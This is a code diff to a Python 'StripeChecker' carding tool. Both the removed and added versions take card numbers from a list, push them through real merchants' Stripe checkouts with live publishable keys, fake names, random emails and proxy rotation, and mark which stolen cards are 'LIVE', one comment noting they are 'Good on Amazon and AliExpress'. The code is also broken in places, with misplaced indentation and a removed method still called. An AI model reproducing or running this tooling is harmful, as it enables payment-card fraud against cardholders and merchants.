@@ -1,10 +1,11 @@
-# -*- coding: utf-8 -*-
+from colorama import Fore, Back, init
 from bs4 import BeautifulSoup
-from itertools import cycle
 import requests
+import random
 import json
-import threading
-import colorama
+import time
+import string
+import os
 
 
 
@@ -42,129 +43,83 @@ class StripeChecker():
         print("         {}------========================------\n".format(fg[0]))
         self.check()
 
-    def check(self):
-        proxy_lists = []
-        cc_list = open('cc.txt', 'r').read()
-        cc_list = cc_list.split('\n')
-        credit_entry = 0
-        # threads = []
+   def randomString2(stringLength=8):
+    """Generate a random string of fixed length """
+    letters= string.ascii_lowercase
+    return ''.join(random.sample(letters,stringLength))
 
-        with open('proxies.txt', 'r') as proxy_list:
-            proxy = proxy_list.read()
-            proxy = proxy.split('\n')
-            for x in proxy:
-                proxy_lists.append(x)
+def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson"):
+    ccEntry = str(ccEntry)
+    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
+    api_token = "https://api.stripe.com/v1/tokens"
+    session = requests.Session()
+    main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
+    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+    
+    headers = {
+        'User-Agent': user_agent,
+        'Accept': 'application/json',
+        'Accept-Language': 'en-US',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://js.stripe.com',
+    }
 
-        proxy_pool = cycle(proxy_lists)
-        Username = str(input(fg[2] + '[*]' + reset + ' Enter Full Name: '))
-        zipcode = str(input(fg[2] + '[*]' + reset + "Enter CC's ZipCode: "))
-        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n] '))
-        isproxyused = False
+    stripe_data = {
+        'time_on_page': random.randint(55382, 68020),
+        'guid': 'e8c975ed-c2e1-4cfb-ac82-1fb96d4ad03f',
+        'muid': '76fa122a-d9cf-44d8-b9ab-4e09c50bf66a',
+        'sid': '34618fcb-8540-419c-8d6b-dd16d55c2ed6',
+        'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
+        'payment_user_agent': 'stripe.js/303cf2d',
+        'card[number]': ccNum,
+        'card[cvc]': ccCode,
+        'card[exp_month]': ccMonth,
+        'card[exp_year]': ccYear,
+        'card[name]': firstname + ' ' + lastname,
+    }
+    
+    stripe_response = json.loads(session.post(api_token, data=stripe_data, headers=headers).text)
+    try:
+        token = stripe_response['id']
+    except Exception:
+        print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + stripe_response['error']['message'] + ' / FRAUD DETECT!')
+        return
 
-        if proxyused.lower() == "y":
-            isAuth = str(input(fg[5] + "[?]" + reset + " Proxy is Authenticated?[y/n] "))
+    result_data = {
+        'user_type': '1',
+        'email_id': randomString2(20) + "@gmail.com",
+        'password': randomString2(12),
+        'card-name': firstname + ' ' + lastname,
+        'card-number': ccNum,
+        'card-cvc': ccCode,
+        'amount': '1599',
+        'email': 'none@none.com',
+        'stripe_plan': 'STDmonthly199',
+        'stripeToken': token,
+        'stripe_plan': 'STDmonthly199',
+        'amount': '1.99',
+        'planid': 'STD',
+        'planprice': '1.99',
+        'term': 'monthly',
+    }
+    result = session.post('https://doc2scan.com/signup-register.php', data=result_data,).text
+    try:
+        res = BeautifulSoup(result, 'html.parser').findAll('font', {'color': 'red'})[1].get_text()
+        if 'code' in res.lower():
+            print(Fore.LIGHTGREEN_EX + "[" + ccEntry + "]" "LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", "") + Fore.RESET)
+            with open("lives.txt", "a") as filelive:
+                filelive.write(credit_card + " - Invalid CVV")
+                filelive.close()
+            return("LIVE\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
         else:
-            isAuth = 'n'
+            print("[" + ccEntry + "] DEAD\t----\t" + credit_card + ' => ' + res.replace("\n", ""))
+            return('DEAD\t----\t' + credit_card + " => " + res.replace("\n", ""))
+    except Exception as e:
+        print("LIVE\t----\t" + credit_card)
+        with open("lives.txt", "a") as livefile:
+            livefile.write(credit_card + " - Valid CVV")
+            livefile.close()
+        return("LIVE\t----\t" + credit_card)
 
-        auth = False
-
-        if isAuth.lower() == "y":
-            auth = True
-            username = str(input(fg[2] + '[*]' + reset + ' Username: '))
-            password = str(input(fg[2] + '[*]' + reset + ' Password: '))
-        else:
-            username = ""
-            password = ""
-
-        print(fg[3] + "[*]" + reset + " Start Checking of " + str(len(cc_list)) + " Credit Card.")
-        print()
-        for credit_card in cc_list:
-            session = requests.Session()
-            credit_entry += 1
-            if isproxyused:
-                proxy_to_use = next(proxy_pool)
-
-            session = requests.Session()
-            # session, Username, credit_card, credit_entry,
-            # proxy, username, password, isAuth=False
-
-            try:
-                ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
-            except ValueError:
-                pass
-
-            if isproxyused:
-                if isAuth:
-                    proxy = {'https': "http://" + username + ':' + password + '@' + proxy}
-                else:
-                    proxy = {'https': 'http://' + proxy}
-            else:
-                proxy = {'': ''}
-
-            main_domain_source = BeautifulSoup(session.get(self.main_domain, proxies=proxy).text, 'html.parser')
-            csrf = main_domain_source.find('meta', {'name': 'csrf_token'})['value']
-
-            purchase_data = {
-                "csrf_token": csrf,
-                "source": "stripe",
-                "medium": "default",
-                "initiator": "game",
-                "bp": "af76deea6f03b8b072a3201fc428c956",
-                "price": "$4.95",
-                "email": "grimmhubb@gmail.com",
-                "json": "true"
-            }
-            purchase_response = json.loads(session.post(self.purchase, data=purchase_data, proxies=proxy).text)
-            try:
-                checkout_url = purchase_response['url']
-            except KeyError:
-                print(fg[0] + "[x]" + reset + " Connection Error.")
-                return
-
-            checkout_data = {
-                'card[name]': Username,
-                'card[number]': ccNum,
-                'card[cvc]': ccCode,
-                'card[exp_month]': ccMonth,
-                'card[exp_year]': ccYear,
-                'muid': '92c656cb-a75a-4649-9f5a-74b14df2456d',
-                'sid': '38b382d4-7725-4ed3-af8b-5521049886d8',
-                'payment_user_agent': 'stripe.js/96ae1c95; stripe-js-v3/96ae1c95',
-                'referrer': checkout_url,
-                'key': 'pk_live_YpSNu1qXLz2bvSUqP7TK7P9U',
-                'pasted_fields': 'number'
-            }
-
-            checkout_response = json.loads(session.post(self.stripe_tokens, proxies=proxy, data=checkout_data).text)
-            tok_id = checkout_response['id']
-
-            result_data = {
-                "csrf_token": csrf,
-                "card_token": tok_id,
-                "bp": "af76deea6f03b8b072a3201fc428c956",
-                "email": "grimmhubb@gmail.com",
-                "name": Username
-            }
-            result_response = session.post(checkout_url, proxies=proxy, data=result_data).text
-            print()
-            try:
-                error = BeautifulSoup(result_response, 'html.parser')
-                error_msg = error.find('div', {'class': 'form_errors'}).get_text()
-
-                if error_msg == "Your card's security code is incorrect.":
-                    print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[1] + "└─────── LIVE! ~ But Incorrect CVV (Good on Amazon and AliExpress)")
-
-                else:
-                    print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[0] + "└─────── " + reset + "DEAD ~ Reason: " + str(error_msg))
-
-            except Exception as e:
-                print(e)
-                print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                print(fg[1] + "└─────── LIVE!")
-        print()
-        print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
-        print()
 
 StripeChecker()
